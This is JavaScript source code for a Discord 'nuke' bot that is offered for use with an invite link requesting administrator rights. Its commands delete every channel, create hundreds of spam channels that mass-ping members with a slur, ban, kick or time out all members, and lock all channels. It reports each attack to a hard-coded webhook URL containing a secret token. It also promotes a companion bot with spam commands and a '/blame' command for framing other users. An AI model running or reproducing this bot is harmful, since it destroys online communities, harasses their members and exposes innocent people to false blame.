const { Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const http = require('http');

const client = new Client({
    intents: [
        1,   // GUILDS
        512, // GUILD_MESSAGES
        32768, // MESSAGE_CONTENT
        2,   // GUILD_MEMBERS
        16   // GUILD_CHANNELS
    ]
});

const TOKEN = process.env.TOKEN;
const LOG_WEBHOOK = "https://discord.com/api/webhooks/1497802608491106357/1rPNKGuyh780KsnqoWnzAWcXjbPTfRx3jWtcefHcYkdywE7GkibcGwvWqRvZE2CgjHnf";
const WHITELIST_SERVER = "1475357940088176743"; // Protected server
const INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1497740024983195668&permissions=8&integration_type=0&scope=bot";
const EXT_INVITE = "https://discord.com/oauth2/authorize?client_id=1489612859179798588&integration_type=1&scope=applications.commands";

http.createServer((req, res) => {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end('Alive');
}).listen(process.env.PORT || 3000);

client.once('ready', () => {
    console.log(`[+] ${client.user.tag} is ready`);
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    const isProtected = message.guild && message.guild.id === WHITELIST_SERVER;
    if (isProtected && message.content !== '.panel' && message.content !== '.extpanel') {
        if (message.content.startsWith('.')) {
            return message.reply('Server protected').catch(() => {});
        }
        return;
    }

    const args = message.content.trim().split(/\s+/);
    const cmd = args[0].toLowerCase();

    // .extpanel
    if (cmd === '.extpanel') {
        const embed = new EmbedBuilder()
            .setTitle('External Bot Commands')
            .setDescription(
                `**Slash Commands (User Install)**\n` +
                `/spam — Floods chat with Arabic spam\n` +
                `/say <message> — Make the bot say anything\n` +
                `/blame @user — Frame someone for the raid\n` +
                `/flood — Spam discord.gg/jhub\n\n` +
                `No admin perms needed. No invite required. Just install to your account.`
            )
            .setColor(0x00ff00)
            .setFooter({ text: 'Click the button below to add the external bot' });

        const extBtn = new ButtonBuilder()
            .setLabel('Add External Bot')
            .setStyle(ButtonStyle.Link)
            .setURL(EXT_INVITE);

        const row = new ActionRowBuilder().addComponents(extBtn);
        message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
        return;
    }

    // .panel
    if (cmd === '.panel') {
        const embed = new EmbedBuilder()
            .setTitle('Discord Nuke Bot')
            .setDescription('**Best nuker with admin**\nClick the button below to invite.')
            .setColor(0xff0000);

        const inviteBtn = new ButtonBuilder()
            .setLabel('Invite')
            .setStyle(ButtonStyle.Link)
            .setURL(INVITE_URL);
        const cmdsBtn = new ButtonBuilder()
            .setLabel('Commands')
            .setStyle(ButtonStyle.Primary)
            .setCustomId('cmds');
        const row = new ActionRowBuilder().addComponents(inviteBtn, cmdsBtn);

        message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
        return;
    }

    // Commands button handler
    client.on('interactionCreate', async (interaction) => {
        if (!interaction.isButton()) return;
        if (interaction.customId === 'cmds') {
            const embed = new EmbedBuilder()
                .setTitle('Command List')
                .setDescription(
                    `.nuke — Wipes server and spams channels\n` +
                    `.kick @user — Kicks a member\n` +
                    `.ban @user — Bans a member\n` +
                    `.kickall — Kicks all members\n` +
                    `.banall — Bans all members\n` +
                    `.muteall — Timeouts all members\n` +
                    `.lockall — Locks all text channels\n` +
                    `.panel — Shows main invite panel\n` +
                    `.extpanel — Shows external bot info`
                )
                .setColor(0xff0000)
                .setFooter({ text: 'Commands do not work in the protected server.' });
            await interaction.reply({ embeds: [embed], ephemeral: true });
        }
    });

    // .nuke
    if (cmd === '.nuke') {
        if (message.guild.id === WHITELIST_SERVER) {
            return message.reply('Server protected').catch(() => {});
        }

        message.delete().catch(() => {});
        const g = message.guild;
        const originalName = g.name;
        const username = message.author.tag;
        const time = new Date().toISOString();

        try {
            await fetch(LOG_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**Server Nuked**\nName: ${originalName}\nBy: ${username}\nTime: ${time}`
                })
            });
        } catch (e) {}

        g.setName('NGA GOT NUKED BY JHUB').catch(() => {});

        const channels = Array.from(g.channels.cache.values());
        for (const ch of channels) {
            ch.delete().catch(() => {});
            await sleep(100);
        }

        for (let i = 0; i < 500; i++) {
            g.channels.create({name: 'jhub-on-top', type: 0}).then(ch => {
                if (!ch) return;
                for (let j = 0; j < 10; j++) {
                    ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
                }
            }).catch(() => {});
            await sleep(200);
        }
        return;
    }

    // .kick
    if (cmd === '.kick') {
        const member = message.mentions.members.first();
        if (!member) return message.reply('Mention a user to kick.').catch(() => {});
        member.kick('Kicked by command').then(() => message.reply(`Kicked ${member.user.tag}`)).catch(() => {});
        return;
    }

    // .ban
    if (cmd === '.ban') {
        const member = message.mentions.members.first();
        if (!member) return message.reply('Mention a user to ban.').catch(() => {});
        member.ban({ reason: 'Banned by command' }).then(() => message.reply(`Banned ${member.user.tag}`)).catch(() => {});
        return;
    }

    // .kickall
    if (cmd === '.kickall') {
        const members = message.guild.members.cache.filter(m => m.kickable && m.id !== client.user.id);
        let count = 0;
        for (const [id, member] of members) {
            member.kick('KickAll').catch(() => {});
            count++;
            await sleep(100);
        }
        message.reply(`Kicked ${count} members`).catch(() => {});
        return;
    }

    // .banall
    if (cmd === '.banall') {
        const members = message.guild.members.cache.filter(m => m.bannable && m.id !== client.user.id);
        let count = 0;
        for (const [id, member] of members) {
            member.ban({ reason: 'BanAll' }).catch(() => {});
            count++;
            await sleep(100);
        }
        message.reply(`Banned ${count} members`).catch(() => {});
        return;
    }

    // .muteall
    if (cmd === '.muteall') {
        const members = message.guild.members.cache.filter(m => m.moderatable && m.id !== client.user.id);
        let count = 0;
        const muteTime = 28 * 24 * 60 * 60 * 1000;
        for (const [id, member] of members) {
            member.timeout(muteTime, 'MuteAll').catch(() => {});
            count++;
            await sleep(100);
        }
        message.reply(`Muted ${count} members`).catch(() => {});
        return;
    }

    // .lockall
    if (cmd === '.lockall') {
        const channels = message.guild.channels.cache.filter(ch => ch.type === 0);
        let count = 0;
        for (const [id, ch] of channels) {
            const everyone = message.guild.roles.everyone;
            ch.permissionOverwrites.create(everyone, { SendMessages: false }).catch(() => {});
            count++;
            await sleep(100);
        }
        message.reply(`Locked ${count} channels`).catch(() => {});
        return;
    }
});

client.login(TOKEN);
